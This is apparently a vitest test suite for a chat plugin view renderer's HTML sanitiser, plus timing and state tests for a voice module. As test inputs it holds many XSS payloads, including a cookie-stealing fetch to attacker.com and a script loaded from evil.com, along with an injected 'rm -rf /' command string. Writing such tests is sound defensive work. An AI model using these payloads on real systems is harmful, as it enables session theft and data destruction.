/**
 * CoreBlow Stage 8 — Interactive Plugin Views & Voice Companion Adversarial Stress Test Suite
 *
 * Empirical verification suite by Teamwork Challenger 2 (Stage 8 Phase 2).
 * Stress-tests:
 * 1. sanitizeChatViewText:
 *    - Polyglot XSS attacks (<SCRIPT>, <img onerror>, <svg onload>, javascript:, nested tags, encoded vectors)
 *    - Event handlers in button labels, action commands, and styles
 *    - Mixed-case, whitespace-padded, and obfuscated protocols
 * 2. renderChatNativeView:
 *    - Cockpit HTML snippet validation: ensures all dynamic user input is sanitized against executable tokens
 *    - Structured blocks robustness: preserves data fidelity, immutability, handles edge cases without throwing
 * 3. computeVoiceRealTimeFactor:
 *    - Division by zero / negative values: audioDurationMs: 0, negative duration, negative latency
 *    - Boundary precision: exact rtf === 0.4000 (PASS) vs rtf === 0.4001 (FAIL)
 *    - Backend tagging: apple-mlx-neural, local-onnx, cloud-fallback
 * 4. Voice Companion State Machine resilience:
 *    - Degraded escalation and recovery cycles
 */

import { describe, expect, it } from "vitest";
import {
  type ChatNativePluginView,
  type ChatNativeViewType,
  type ChatViewActionButton,
  type ChatViewBadge,
  renderChatNativeView,
  sanitizeChatViewText,
} from "./chat-view-renderer.js";
import {
  computeVoiceRealTimeFactor,
  createVoiceCompanionSession,
  SOVEREIGN_RTF_TARGET,
  transitionVoiceCompanionState,
  type VoiceCompanionBackend,
} from "../../tts/sovereign-voice-companion.js";

describe("Adversarial Stress Test: sanitizeChatViewText & Polyglot XSS Vectors", () => {
  it("neutralizes uppercase and mixed-case SCRIPT tags", () => {
    const vectors = [
      "<SCRIPT>alert(1)</SCRIPT>",
      "<sCrIpT>alert(1)</ScRiPt>",
      "<SCRIPT/X>alert(1)</SCRIPT>",
      "<SCRIPT src='http://evil.com/xss.js'></SCRIPT>",
    ];

    for (const vector of vectors) {
      const sanitized = sanitizeChatViewText(vector);
      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
      expect(sanitized).toContain("&lt;");
      expect(sanitized).toContain("&gt;");
    }
  });

  it("neutralizes <img src=x onerror=alert(1)> and unquoted attribute vectors", () => {
    const vectors = [
      "<img src=x onerror=alert(1)>",
      "<img src='x' onerror='alert(1)'>",
      '<img src="x" onerror="alert(1)">',
      "<IMG SRC=X ONERROR=ALERT(1)>",
      "<img src=x onerror = alert(1)>",
    ];

    for (const vector of vectors) {
      const sanitized = sanitizeChatViewText(vector);
      expect(sanitized).not.toContain("<img");
      expect(sanitized).not.toContain("<IMG");
      expect(sanitized).not.toMatch(/(?<!data-blocked-)onerror\s*=/i);
      expect(sanitized).toContain("data-blocked-");
    }
  });

  it("neutralizes <svg onload=alert(1)> and SVG-based execution vectors", () => {
    const vectors = [
      "<svg onload=alert(1)>",
      "<svg/onload=alert(1)>",
      "<SVG ONLOAD=ALERT(1)>",
      "<svg onload = alert(1)>",
      '<svg><script>alert(1)</script></svg>',
    ];

    for (const vector of vectors) {
      const sanitized = sanitizeChatViewText(vector);
      expect(sanitized).not.toContain("<svg");
      expect(sanitized).not.toContain("<SVG");
      expect(sanitized).not.toMatch(/(?<!data-blocked-)onload\s*=/i);
    }
  });

  it("neutralizes javascript: and javascript:void(0) pseudo-protocols", () => {
    const vectors = [
      "javascript:void(0)",
      "javascript:alert(1)",
      "JAVASCRIPT:alert(1)",
      "JavaScript:void(0)",
      "javascript :alert(1)",
      "javascript   :void(0)",
      '<a href="javascript:void(0)">link</a>',
      '<a href="javascript:alert(document.cookie)">steal</a>',
    ];

    for (const vector of vectors) {
      const sanitized = sanitizeChatViewText(vector);
      expect(sanitized).not.toMatch(/(?<!blocked-)javascript\s*:/i);
      expect(sanitized).toContain("blocked-javascript:");
    }
  });

  it("neutralizes nested tags and stripped mutation attempts <<script>script>", () => {
    const vectors = [
      "<<script>script>",
      "<<SCRIPT>SCRIPT>",
      "<script<script>>alert(1)</script></script>",
      "<<script>alert(1)</script>>",
      "<scr<script>ipt>alert(1)</scr</script>ipt>",
    ];

    for (const vector of vectors) {
      const sanitized = sanitizeChatViewText(vector);
      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
      expect(sanitized).toContain("&lt;");
      expect(sanitized).toContain("&gt;");
    }
  });

  it("safely handles already entity-encoded vectors without unescaping into raw HTML", () => {
    const encoded = "&lt;script&gt;alert(1)&lt;/script&gt;";
    const sanitized = sanitizeChatViewText(encoded);
    // Should NOT become unescaped <script>
    expect(sanitized).not.toContain("<script>");
    expect(sanitized).toContain("&lt;script&gt;");
  });

  it("neutralizes quote breakouts in attribute contexts", () => {
    const breakoutVectors = [
      '"><script>alert(1)</script>',
      "';alert(1)//",
      '" onmouseover="alert(1)',
      "' onclick='alert(1)",
      'style="background:red" onfocus="alert(1)"',
    ];

    for (const vector of breakoutVectors) {
      const sanitized = sanitizeChatViewText(vector);
      expect(sanitized).not.toContain('"');
      expect(sanitized).not.toContain("'");
      expect(sanitized).not.toMatch(/(?<!data-blocked-)on\w+\s*=/i);
    }
  });

  it("handles malicious button labels and action command strings", () => {
    const maliciousLabel = '<span onclick="evil()">Click Me</span>';
    const maliciousAction = 'javascript:fetch("https://attacker.com/?t=" + document.cookie)';

    const sanitizedLabel = sanitizeChatViewText(maliciousLabel);
    const sanitizedAction = sanitizeChatViewText(maliciousAction);

    expect(sanitizedLabel).not.toContain("<span");
    expect(sanitizedLabel).toContain("data-blocked-onclick=");
    expect(sanitizedAction).toContain("blocked-javascript:fetch");
    expect(sanitizedAction).not.toMatch(/(?<!blocked-)javascript\s*:/i);
  });
});

describe("Adversarial Stress Test: Cockpit HTML Snippet Validation", () => {
  it("completely neutralizes dangerous executable tokens across all view fields and action properties", () => {
    const adversarialView: ChatNativePluginView = {
      viewId: 'test-view-id"><script>alert("viewId")</script>',
      pluginId: 'test-plugin-id" onmouseover="alert("pluginId")',
      viewType: "approval_prompt",
      title: '<SCRIPT>alert("title")</SCRIPT><img src=x onerror=alert(1)>',
      subtitle: '<a href="javascript:void(0)">Subtitle Link</a>',
      fields: [
        {
          label: '<svg onload=alert("field-label")>Status</svg>',
          value: '<iframe src="javascript:alert(1)">Value</iframe>',
          badge: 'error' as ChatViewBadge,
        },
        {
          label: 'Nested Vector',
          value: '<<script>script>alert(1)<</script>/script>',
          badge: 'warn' as ChatViewBadge,
        },
      ],
      actions: [
        {
          id: 'act-1" onclick="alert("actId")',
          label: '<button onfocus="alert(1)">Confirm</button>',
          actionUrlOrCommand: 'javascript:alert("actionCmd")',
          style: 'primary',
          requiresConfirmation: true,
        },
        {
          id: 'act-2',
          label: 'Danger Action " onmouseover="alert(2)',
          actionUrlOrCommand: '/api/command; rm -rf /',
          style: 'danger',
        },
      ],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(adversarialView);
    const html = rendered.cockpitHtmlSnippet;

    // 1. No executable opening/closing script tags
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/<\/script/i);

    // 2. No active un-blocked event handlers
    expect(html).not.toMatch(/(?<!data-blocked-)\bon[a-zA-Z]+\s*=/i);

    // 3. No executable javascript: or vbscript: pseudo-protocols
    expect(html).not.toMatch(/(?<!blocked-)(?:javascript|vbscript)\s*:/i);

    // 4. No unescaped angle brackets from user inputs
    // The only angle brackets in html must be from the template markup itself:
    // <div, </div>, <h3, </h3>, <p, </p>, <dl, </dl>, <dt, </dt>, <dd, </dd>, <span, </span>, <button, </button>
    const userTokensNotPresent = [
      "<SCRIPT>",
      "<img",
      "<svg",
      "<iframe",
      "<button onfocus",
      'alert("viewId")',
      'alert("pluginId")',
    ];
    for (const token of userTokensNotPresent) {
      expect(html).not.toContain(token);
    }

    // 5. Template elements remain properly structured
    expect(html).toContain('class="coreblow-chat-view coreblow-chat-view-approval_prompt"');
    expect(html).toContain('class="coreblow-btn coreblow-btn-primary"');
    expect(html).toContain('data-requires-confirmation="true"');
  });

  it("safely renders views with empty fields, missing subtitles, and no actions", () => {
    const minimalView: ChatNativePluginView = {
      viewId: "view-min",
      pluginId: "plugin-min",
      viewType: "quota_gauge",
      title: "Clean Minimal View",
      fields: [],
      actions: [],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(minimalView);

    expect(rendered.cockpitHtmlSnippet).toContain('data-view-id="view-min"');
    expect(rendered.cockpitHtmlSnippet).not.toContain("coreblow-chat-view-subtitle");
    expect(rendered.cockpitHtmlSnippet).not.toContain("coreblow-chat-view-actions");
    expect(rendered.markdownCard).not.toContain("**Fields:**");
    expect(rendered.markdownCard).not.toContain("**Actions:**");
  });

  it("handles non-finite or invalid updatedAtMs timestamps gracefully", () => {
    const viewBadTimestamp: ChatNativePluginView = {
      viewId: "view-bad-ts",
      pluginId: "plugin-core",
      viewType: "memory_wiki_card",
      title: "Bad Timestamp View",
      fields: [{ label: "Field", value: "Value" }],
      actions: [],
      updatedAtMs: Number.NaN,
    };

    expect(() => renderChatNativeView(viewBadTimestamp)).not.toThrow();
    const rendered = renderChatNativeView(viewBadTimestamp);
    expect(rendered.markdownCard).toMatch(/_Updated: \d{4}-\d{2}-\d{2}T/);
  });
});

describe("Adversarial Stress Test: Structured Blocks Data Preservation", () => {
  it("preserves unescaped data fidelity in structuredBlocks while sanitizing HTML", () => {
    const rawTitle = '<script>alert("exact")</script>';
    const rawActionCmd = 'javascript:window.location="https://attacker.com"';
    const view: ChatNativePluginView = {
      viewId: "view-fidelity",
      pluginId: "plugin-test",
      viewType: "pr_scorecard",
      title: rawTitle,
      fields: [{ label: "Status", value: "Raw & Unescaped <Value>" }],
      actions: [
        {
          id: "act-1",
          label: "Execute",
          actionUrlOrCommand: rawActionCmd,
          style: "primary",
        },
      ],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(view);

    // HTML must be sanitized
    expect(rendered.cockpitHtmlSnippet).not.toContain("<script>");
    expect(rendered.cockpitHtmlSnippet).toContain("&lt;script&gt;");

    // structuredBlocks must preserve the exact raw payload structure for machine consumers
    expect(rendered.structuredBlocks.title).toBe(rawTitle);
    const fields = rendered.structuredBlocks.fields as readonly { label: string; value: string }[];
    expect(fields[0]?.value).toBe("Raw & Unescaped <Value>");
    const actions = rendered.structuredBlocks.actions as readonly ChatViewActionButton[];
    expect(actions[0]?.actionUrlOrCommand).toBe(rawActionCmd);
  });

  it("ensures structuredBlocks and nested arrays are deep-frozen and immutable", () => {
    const view: ChatNativePluginView = {
      viewId: "view-freeze",
      pluginId: "plugin-freeze",
      viewType: "kanban_board",
      title: "Immutability Test",
      fields: [{ label: "Col1", value: "Val1" }],
      actions: [{ id: "a1", label: "Button", actionUrlOrCommand: "/cmd", style: "secondary" }],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(view);

    expect(Object.isFrozen(rendered.structuredBlocks)).toBe(true);
    expect(Object.isFrozen(rendered.structuredBlocks.fields)).toBe(true);
    expect(Object.isFrozen(rendered.structuredBlocks.actions)).toBe(true);

    const fields = rendered.structuredBlocks.fields as readonly unknown[];
    expect(Object.isFrozen(fields[0])).toBe(true);

    const actions = rendered.structuredBlocks.actions as readonly unknown[];
    expect(Object.isFrozen(actions[0])).toBe(true);

    // Mutation in strict mode must throw
    expect(() => {
      // @ts-expect-error testing runtime immutability
      rendered.structuredBlocks.title = "mutated";
    }).toThrow();
  });

  it("handles high field counts (100+ items) and massive text payloads without throwing", () => {
    const largeText = "A".repeat(20_000);
    const manyFields = Array.from({ length: 120 }, (_, idx) => ({
      label: `Field-${idx}`,
      value: `Value-${idx}-${largeText.slice(0, 50)}`,
      badge: idx % 3 === 0 ? ("ok" as const) : idx % 3 === 1 ? ("warn" as const) : ("error" as const),
    }));

    const view: ChatNativePluginView = {
      viewId: "view-large",
      pluginId: "plugin-heavy",
      viewType: "kanban_board",
      title: `Large View (${largeText.slice(0, 100)})`,
      fields: manyFields,
      actions: [],
      updatedAtMs: 1770000000000,
    };

    const rendered = renderChatNativeView(view);
    expect(rendered.markdownCard.length).toBeGreaterThan(1000);
    expect(rendered.cockpitHtmlSnippet.length).toBeGreaterThan(1000);
    const blocksFields = rendered.structuredBlocks.fields as readonly unknown[];
    expect(blocksFields.length).toBe(120);
  });
});

describe("Adversarial Stress Test: computeVoiceRealTimeFactor", () => {
  describe("Division by Zero & Negative Values", () => {
    it("handles audioDurationMs = 0 safely without division by zero or Infinity", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 0,
        synthesisLatencyMs: 100,
        utteranceLengthChars: 25,
      });

      // Math.max(1, 0) => 1, so RTF = 100 / 1 = 100
      expect(Number.isFinite(telemetry.rtf)).toBe(true);
      expect(telemetry.rtf).toBe(100);
      expect(telemetry.meetsSovereignTarget).toBe(false);
      expect(telemetry.audioDurationMs).toBe(0);
      expect(telemetry.synthesisLatencyMs).toBe(100);
    });

    it("handles negative audioDurationMs safely without producing negative or invalid RTF", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: -500,
        synthesisLatencyMs: 200,
      });

      // Math.max(1, -500) => 1, so RTF = 200 / 1 = 200
      expect(Number.isFinite(telemetry.rtf)).toBe(true);
      expect(telemetry.rtf).toBe(200);
      expect(telemetry.meetsSovereignTarget).toBe(false);
      expect(telemetry.audioDurationMs).toBe(-500);
    });

    it("handles negative synthesisLatencyMs safely without producing negative RTF", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 1000,
        synthesisLatencyMs: -150,
      });

      // Math.max(0, -150) => 0, so RTF = 0 / 1000 = 0
      expect(telemetry.rtf).toBe(0);
      expect(telemetry.meetsSovereignTarget).toBe(true);
      expect(telemetry.synthesisLatencyMs).toBe(-150);
    });

    it("handles both audioDurationMs and synthesisLatencyMs as 0", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 0,
        synthesisLatencyMs: 0,
      });

      // Math.max(1, 0) => 1, Math.max(0, 0) => 0, RTF = 0 / 1 = 0
      expect(telemetry.rtf).toBe(0);
      expect(telemetry.meetsSovereignTarget).toBe(true);
    });

    it("handles fractional millisecond durations safely", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 1250.5,
        synthesisLatencyMs: 312.625,
      });

      // 312.625 / 1250.5 = 0.25
      expect(telemetry.rtf).toBe(0.25);
      expect(telemetry.meetsSovereignTarget).toBe(true);
    });
  });

  describe("Exact Boundary Certification: 0.4000 vs 0.4001", () => {
    it("certifies RTF when exactly at 0.4000 boundary (MUST PASS)", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 10_000,
        synthesisLatencyMs: 4_000, // 4000 / 10000 = 0.4000
      });

      expect(telemetry.rtf).toBe(0.4);
      expect(telemetry.meetsSovereignTarget).toBe(true);
    });

    it("fails certification when RTF is 0.4001 (MUST FAIL)", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 10_000,
        synthesisLatencyMs: 4_001, // 4001 / 10000 = 0.4001
      });

      expect(telemetry.rtf).toBe(0.4001);
      expect(telemetry.meetsSovereignTarget).toBe(false);
    });

    it("certifies RTF when just below boundary at 0.3999 (MUST PASS)", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 10_000,
        synthesisLatencyMs: 3_999, // 3999 / 10000 = 0.3999
      });

      expect(telemetry.rtf).toBe(0.3999);
      expect(telemetry.meetsSovereignTarget).toBe(true);
    });

    it("evaluates boundary on 1000ms duration scale", () => {
      const passTelemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 1000,
        synthesisLatencyMs: 400,
      });
      expect(passTelemetry.rtf).toBe(0.4);
      expect(passTelemetry.meetsSovereignTarget).toBe(true);

      const failTelemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 1000,
        synthesisLatencyMs: 401,
      });
      expect(failTelemetry.rtf).toBe(0.401);
      expect(failTelemetry.meetsSovereignTarget).toBe(false);
    });
  });

  describe("Backend Tagging & Telemetry Certification", () => {
    it("defaults to apple-mlx-neural when backend is omitted", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 2000,
        synthesisLatencyMs: 500,
      });

      expect(telemetry.backend).toBe("apple-mlx-neural");
    });

    it("preserves explicit apple-mlx-neural backend", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 2000,
        synthesisLatencyMs: 500,
        backend: "apple-mlx-neural",
      });

      expect(telemetry.backend).toBe("apple-mlx-neural");
    });

    it("preserves explicit local-onnx backend", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 2000,
        synthesisLatencyMs: 500,
        backend: "local-onnx",
      });

      expect(telemetry.backend).toBe("local-onnx");
    });

    it("preserves explicit cloud-fallback backend", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 2000,
        synthesisLatencyMs: 500,
        backend: "cloud-fallback",
      });

      expect(telemetry.backend).toBe("cloud-fallback");
    });

    it("returns deeply immutable telemetry object", () => {
      const telemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 1000,
        synthesisLatencyMs: 300,
      });

      expect(Object.isFrozen(telemetry)).toBe(true);
      expect(() => {
        // @ts-expect-error testing immutability
        telemetry.rtf = 0.1;
      }).toThrow();
    });
  });

  describe("Voice Companion State Transition Dynamics", () => {
    it("maintains healthy speaking state when RTF is <= 0.40", () => {
      let session = createVoiceCompanionSession({ backend: "apple-mlx-neural" });
      const healthyTelemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 1000,
        synthesisLatencyMs: 350,
      });

      session = transitionVoiceCompanionState(session, {
        type: "SYNTHESIS_FINISHED",
        telemetry: healthyTelemetry,
      });

      expect(session.state).toBe("speaking");
      expect(session.consecutiveDegradedCount).toBe(0);
      expect(session.activeBackend).toBe("apple-mlx-neural");
    });

    it("resets consecutiveDegradedCount when a healthy synthesis follows a degraded one", () => {
      let session = createVoiceCompanionSession({ backend: "apple-mlx-neural" });
      const slowTelemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 1000,
        synthesisLatencyMs: 500, // RTF = 0.5
      });
      const healthyTelemetry = computeVoiceRealTimeFactor({
        audioDurationMs: 1000,
        synthesisLatencyMs: 350, // RTF = 0.35
      });

      // 1st slow synthesis
      session = transitionVoiceCompanionState(session, {
        type: "SYNTHESIS_FINISHED",
        telemetry: slowTelemetry,
      });
      expect(session.consecutiveDegradedCount).toBe(1);

      // Healthy synthesis resets streak
      session = transitionVoiceCompanionState(session, {
        type: "SYNTHESIS_FINISHED",
        telemetry: healthyTelemetry,
      });
      expect(session.consecutiveDegradedCount).toBe(0);
      expect(session.state).toBe("speaking");
      expect(session.activeBackend).toBe("apple-mlx-neural");
    });
  });
});
